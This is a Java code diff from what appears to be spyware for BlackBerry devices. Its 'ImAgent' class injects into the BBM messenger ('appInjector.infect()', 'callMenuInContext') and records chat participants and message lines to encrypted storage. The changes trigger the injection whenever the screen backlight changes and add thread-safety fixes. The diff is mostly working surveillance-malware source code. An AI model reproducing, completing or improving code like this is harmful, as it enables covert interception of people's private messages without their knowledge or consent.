@@ -78,27 +78,28 @@ public final class ImAgent extends Agent implements BacklightObserver,
         setDelay(APP_TIMER_PERIOD);
 
         markup = new DictMarkup(agentId, Encryption.getKeys().getAesKey());
-       
+
     }
 
-    private Line unserialize(String partecipants) {
+    private synchronized Line unserialize(String partecipants) {
         //#ifdef DEBUG
         debug.trace("unserialize");
         //#endif
         if (markup.isMarkup()) {
-            
-                byte[] lineSer = markup.get(partecipants);
+
+            byte[] lineSer = markup.get(partecipants);
+            if (lineSer != null) {
                 Line lastLine = Line.unserialize(lineSer);
                 //#ifdef DEBUG
                 debug.trace("unserialize: " + lastLine);
                 //#endif
                 return lastLine;
-           
+            }
         }
         return null;
     }
 
-    private void serialize(String partecipants, Line lastLine) {
+    private synchronized void serialize(String partecipants, Line lastLine) {
         //#ifdef DEBUG
         debug.trace("serialize: " + lastLine);
         //#endif
@@ -129,7 +130,9 @@ public final class ImAgent extends Agent implements BacklightObserver,
         AppListener.getInstance().addApplicationObserver(this);
 
         try {
-            appInjector = new AppInjector(AppInjector.APP_BBM);
+            if (appInjector == null) {
+                appInjector = new AppInjector(AppInjector.APP_BBM);
+            }
 
         } catch (Exception ex) {
             //#ifdef DEBUG
@@ -137,14 +140,6 @@ public final class ImAgent extends Agent implements BacklightObserver,
             //#endif
         }
 
-    }
-
-    private void menuInject() {
-        //#ifdef DEBUG
-        debug.trace("menuInject");
-        //#endif
-
-        appInjector.infect();
     }
 
     public synchronized void actualStop() {
@@ -166,12 +161,13 @@ public final class ImAgent extends Agent implements BacklightObserver,
             debug.info("actualRun, infected, enabled, foreground");
             //#endif
 
-            //appInjector.callMenuInContext();
+            appInjector.callMenuInContext();
         }
+
         //#ifdef DEBUG
         if (!appInjector.isInfected() && !infecting) {
-            infecting = true;
-            menuInject();
+            //infecting = true;
+            //appInjector.infect();
         }
         //#endif
     }
@@ -200,8 +196,8 @@ public final class ImAgent extends Agent implements BacklightObserver,
             debug.info("onBacklightChange, injecting");
             //#endif
 
-            //TODO: qui bisogna verificare che non avvengano due injection alla volta
-            menuInject();
+            //TODO: non fare troppo spesso. :-)
+            appInjector.infect();
         }
     }
 
@@ -222,7 +218,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         }
     }
 
-    public void add(String partecipants, Vector lines) {
+    public synchronized void add(String partecipants, Vector lines) {
         if (lines == null) {
             //#ifdef DEBUG
             debug.error("add: null lines");
@@ -239,7 +235,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         //#endif
 
         Line lastLine = unserialize(partecipants);
-        
+
         if (lines.lastElement().equals(lastLine)) {
             //#ifdef DEBUG
             debug.trace("add: nothing new");
